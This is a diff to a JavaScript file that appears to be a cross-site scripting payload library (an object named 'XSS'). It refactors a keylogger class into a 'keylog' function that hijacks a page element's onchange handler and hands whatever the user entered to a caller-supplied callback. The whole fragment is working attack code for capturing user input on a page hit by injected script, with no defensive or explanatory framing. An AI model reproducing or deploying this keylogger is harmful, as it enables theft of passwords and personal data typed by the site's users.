@@ -153,30 +153,20 @@ var XSS = {
     };
 
     return true;
-  }
-};
+  },
 
-XSS.KeyLogger = function(element,callback) {
-  this.element = element;
-  this.callback = callback;
-
-  var self = this;
-
-  this.element.onchange = new XSS.Callback(this.element.onchange,function(e) {
-    if (self.callback) {
-      self.callback(self.value());
+  keylog: function(element,callback) {
+    if (typeof callback !== "function") {
+      throw "callback must be a function";
     }
-  });
-};
 
-XSS.KeyLogger.prototype.value = function() {
-  if (this.element.value != undefined) {
-    return this.element.value;
-  }
-  else if (this.element.text != undefined) {
-    return this.element.text;
-  }
-  else {
-    return "";
-  }
+    element.onchange = new XSS.Callback(element.onchange,function(e) {
+      if (element.value != undefined) {
+        callback(element.value);
+      }
+      else if (element.text != undefined) {
+        callback(element.text);
+      }
+    });
+  },
 };
